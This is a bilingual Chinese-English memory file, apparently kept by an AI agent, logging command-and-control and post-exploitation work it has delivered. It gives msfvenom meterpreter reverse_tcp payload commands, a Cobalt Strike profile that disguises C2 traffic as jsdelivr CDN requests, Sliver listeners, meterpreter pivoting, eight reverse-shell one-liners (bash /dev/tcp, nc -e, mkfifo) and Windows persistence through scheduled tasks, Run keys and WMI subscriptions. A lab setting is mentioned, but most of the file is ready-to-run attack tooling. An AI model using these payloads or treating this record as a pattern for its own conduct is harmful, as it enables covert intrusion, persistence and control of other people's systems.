---
name: c2-post-ex-track-record
description: C2 与后渗透工作轨迹 —— msfvenom、Cobalt Strike malleable profile、Sliver、meterpreter pivoting、Windows persistence、reverse shell cheatsheet | C2 and post-ex track record
metadata:
  type: project
---

## 已交付类别

- **msfvenom 5 种 payload 格式**：
  - Windows x64 EXE staged: `-p windows/x64/meterpreter/reverse_tcp LHOST=<h> LPORT=4444 -f exe`
  - Windows x64 DLL: `-f dll`
  - Linux ELF: `-p linux/x64/meterpreter/reverse_tcp -f elf`
  - Raw shellcode for loader: `-f raw`
  - Encoded PS one-liner: `cmd/windows/reverse_powershell`
  - `handler.rc` for msfconsole `-r`：`use exploit/multi/handler + set PAYLOAD + set ExitOnSession false + exploit -j`
  - Staged 比 stageless 更稳（TCP retry 好）

- **Cobalt Strike malleable profile**（in a lab environment; Sliver is the OSS alternative）：
  - jsdelivr-flavored profile 基础 + `sleeptime 60000 jitter 37`
  - `spawnto_x64 = %windir%\sysnative\gpupdate.exe`
  - HTTP: GET `/npm/package/dist/index.min.js` + Referer `https://cdn.jsdelivr.net/`
  - `c2lint profile.profile` 必过
  - Wireshark 验证 wire shape 匹配

- **Sliver v1.5.42**：
  - HTTPS listener: `https --lhost --lport 443 --letsencrypt <domain>`
  - mTLS listener on 4444
  - Implant per-transport（一个 implant 一个 transport；HTTPS + mTLS 都要就 gen 两个）
  - `portfwd add` 建 tunnel

- **Meterpreter pivoting**：
  - `run autoroute -s 10.10.20.0/24`
  - `use auxiliary/server/socks_proxy + set VERSION 5 + set SRVPORT 1080 + run -j`
  - `/etc/proxychains4.conf` 加 `socks5 127.0.0.1 1080`
  - proxychains 只支持 TCP，用 `-Pn -sT`；ARP scan / ICMP 不通

- **反弹 shell 8 种**：
  - `bash -i >& /dev/tcp/<h>/<p> 0>&1`（现代 Linux 通用）
  - Python `pty.spawn("/bin/sh")` + `dup2`
  - Perl / PHP / PowerShell（`New-Object System.Net.Sockets.TCPClient`）
  - `nc -e /bin/sh`（老 nc.traditional）
  - `mkfifo /tmp/f; cat /tmp/f | sh 2>&1 | nc | > /tmp/f`
  - 全 TTY 升级 3 步：`pty.spawn` + resize + `stty raw -echo`

- **Windows 持久化 3 法**（all with removal）：
  - **Scheduled Task** (`schtasks /create /tn ... /sc onlogon /ru SYSTEM`)：高检测（audit 4698/4700）
  - **Registry Run key** (`HKCU\...\CurrentVersion\Run`)：中检测（autoruns catch）
  - **WMI event subscription**（`__EventFilter + CommandLineEventConsumer + __FilterToConsumerBinding`）：低检测（Sysmon w/ WMI subs enabled 才抓）
  - 每个都成对写 `_uninstall.ps1`

## 工作模式

- 硬件：Windows target VM lab（10 lab / Server 2019/2022），Kali/Ubuntu as attacker

## 交付形态

`.exe/.dll/.elf/.bin` payload；`handler.rc`；`.profile` malleable profile；`.ps1 / .reg / .xml` persistence installer + `_uninstall.ps1`；`rshells.sh` cheatsheet emitter；`pivot.rc` msfconsole rc-file。

## 相关 memory

- [[pentest-lab-track-record]] AD/pivoting 上游
- [[evasion-malware-track-record]] payload evasion
- [[lpe-track-record]] Meterpreter → SYSTEM
